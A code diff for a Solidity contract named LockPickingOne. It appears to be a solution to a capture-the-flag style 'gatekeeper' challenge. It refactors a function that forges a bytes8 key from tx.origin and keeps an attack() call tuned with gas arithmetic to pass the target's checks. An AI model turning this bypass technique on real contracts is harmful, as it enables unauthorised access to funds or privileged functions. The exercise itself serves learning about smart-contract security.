@@ -13,27 +13,22 @@ contract LockPickingOne {
         gateKeeper = _gateKeeper;
     }
 
-    function constructGateKey() public view returns (bytes8 gateKey) {
-        // Extract the least significant 16 bits from tx.origin
-        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
-        // Construct the gateKey with the following structure: [non-zero bytes][00..00][ls16BitsTxOrigin]
-        // Ensure the most significant 32 bits are not all zeros to satisfy the second requirement
-        // Here, '0x0001' is an arbitrary non-zero value to ensure the most significant 32 bits are not all zeros
-        gateKey = bytes8(
-            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
-        );
-        return gateKey;
-    }
-
     function attack(uint256 gas) external {
-        bytes8 key = constructGateKey();
-
-        // Pass Gate 2: require(gasleft() % 8191 == 0);
-        require(gas < 8191, "gas > 8191");
+        bytes8 key = _constructGateKey();
 
         (bool success, ) = gateKeeper.call{gas: 8191 * 20 + gas}( // gas == 256
             abi.encodeWithSignature("enter(bytes8)", key)
         );
         require(success, "Attack failed");
+    }
+
+    function _constructGateKey() private view returns (bytes8 gateKey) {
+        // Get the last 16 bits of tx.origin
+        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
+        // Concatenate the last 16 bits with 0x0001000000000000
+        gateKey = bytes8(
+            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
+        );
+        return gateKey;
     }
 }
